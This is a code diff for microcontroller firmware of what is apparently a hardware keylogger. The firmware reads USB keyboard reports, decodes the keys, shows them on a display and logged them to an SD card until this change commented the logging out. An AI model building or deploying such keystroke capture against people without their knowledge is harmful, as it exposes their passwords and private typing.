@@ -65,12 +65,6 @@ int main()
     // USB host controller
     usb_init();
 
-    // Sd card detect pin
-    gpio_set_function(1, GPIO_FUNC_SIO);
-    gpio_set_pulldown(1, false);
-    gpio_set_pullup(1,true);
-    sio_init(1);
-    sio_set_dir(1,INPUT);
 
     // Buttons
     // Button 1
@@ -88,12 +82,10 @@ int main()
     sio_set_dir(14,INPUT);
     gpio_set_irq_enabled(14,gpio_irq_event_edge_low, toggle);
 
-    bool sd_init = false;
-    uint8_t sd_buff[600];
-
+    // Sd card
     sd_spi_t sd;
     storage_t storage;
-    uint8_t temp[600] = "D:t is een test 1234 you frequently cannot address a 32-bit word that is not aligned to a 4-byte boundary (as your error is telling you). On x86 you can access non-aligned data, however there is a huge hit on performance. Where an ARM part does support unaligned accesses (e.g. single word normal load), there is a performance penalty and there should be a configurable exception trap. To solve your problem, you would need to request a block of memory that is 4-byte aligned and copy the non-aligned bytes + fill it with garbage bytes to ensure it is 4 byte-aligned";
+    sd_spi_init(&sd,spi0_hw, 17, 19, 20, 18, 1);
 
     int lc = 0;
 //    graphics_print_text(&display, "KEYLOGGER\nDisplay test");
@@ -116,8 +108,9 @@ int main()
         }
         event_task();
         graphics_task(&display);
+        sd_spi_task(&sd);
 
-        if (!sd_init && !sio_get(1)) {
+        /*if (!sd_init && !sio_get(1)) {
             sd = sd_spi_init(spi0_hw, 17, 19, 20, 18);
             storage = storage_init(&sd, sd_buff, 600);
             sd_init = true;
@@ -127,7 +120,7 @@ int main()
 //            }
         }else if(sd_init && !sio_get(1)) {
             storage_task(&storage);
-        }
+        }*/
 
         while(!usb_host_hid_report_queue_is_empty()) {
             hid_report = usb_host_hid_report_dequeue();
@@ -135,7 +128,7 @@ int main()
             int chars = hid_report_parse(&hid_parser, &hid_report, pressed_keys);
             for (int i = 0; i < chars; i++){
                 graphics_print_char(&display, pressed_keys[i]);
-                storage_store_byte(&storage, pressed_keys[i]);
+                //storage_store_byte(&storage, pressed_keys[i]);
             }
         }
         if (ft260_get_output_report(&ft260, &output_report)) {
